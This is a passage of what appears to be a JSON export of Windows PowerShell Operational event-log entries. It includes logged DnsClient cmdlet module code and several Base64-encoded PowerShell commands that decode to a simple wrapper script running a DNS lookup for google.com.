[Alias('Suffix')]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${ConnectionSpecificSuffix},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [bool[]]\r\n    ${RegisterThisConnectionsAddress},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [bool[]]\r\n    ${UseSuffixWhenRegistering},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('InterfaceIndex') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceIndex})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceIndex', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('InterfaceAlias') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceAlias})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceAlias', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('ConnectionSpecificSuffix') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ConnectionSpecificSuffix})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ConnectionSpecificSuffix', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('RegisterThisConnectionsAddress') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${RegisterThisConnectionsAddress})\r\n        $__cmdletization_queryBuilder.FilterByProperty('RegisterThisConnectionsAddress', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('UseSuffixWhenRegistering') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${UseSuffixWhenRegistering})\r\n        $__cmdletization_queryBuilder.FilterByProperty('UseSuffixWhenRegistering', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClient.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClient' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClient\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByAlias', SupportsShouldProcess=$true, ConfirmImpact='Low', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClient')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByName', Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [uint32[]]\r\n    ${InterfaceIndex},\r\n\r\n    [Parameter(ParameterSetName='ByAlias', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${InterfaceAlias},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_DNSClient')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Suffix')]\r\n    [string]\r\n    ${ConnectionSpecificSuffix},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [bool]\r\n    ${RegisterThisConnectionsAddress},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [bool]\r\n    ${UseSuffixWhenRegistering},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('ResetSuffix')]\r\n    [switch]\r\n    ${ResetConnectionSpecificSuffix},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('InterfaceIndex') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceIndex})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceIndex', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('InterfaceAlias') -and (@('ByAlias') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceAlias})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceAlias', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('ByName', 'ByAlias', 'InputObject (cdxml)') -contains $_ } {\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('ConnectionSpecificSuffix')) {\r\n            [object]$__cmdletization_value = ${ConnectionSpecificSuffix}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ConnectionSpecificSuffix'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ConnectionSpecificSuffix'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('RegisterThisConnectionsAddress')) {\r\n            [object]$__cmdletization_value = ${RegisterThisConnectionsAddress}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RegisterThisConnectionsAddress'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RegisterThisConnectionsAddress'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('UseSuffixWhenRegistering')) {\r\n            [object]$__cmdletization_value = ${UseSuffixWhenRegistering}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UseSuffixWhenRegistering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UseSuffixWhenRegistering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('ResetConnectionSpecificSuffix')) {\r\n            [object]$__cmdletization_value = ${ResetConnectionSpecificSuffix}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ResetConnectionSpecificSuffix'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ResetConnectionSpecificSuffix'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClient.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClient' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opened"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 6464 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opening"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8195,
      "details": "Opening RunspacePool"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8194,
      "details": "Creating RunspacePool object \r\n \t InstanceId ef2b26b4-7b9d-461c-b8f8-9b1819a0c584 \r\n \t MinRunspaces 1 \r\n \t MaxRunspaces 1"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8193,
      "details": "Creating Runspace object \r\n \t Instance Id: 9ab12d36-2102-40c4-b028-61254b3e928d"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand 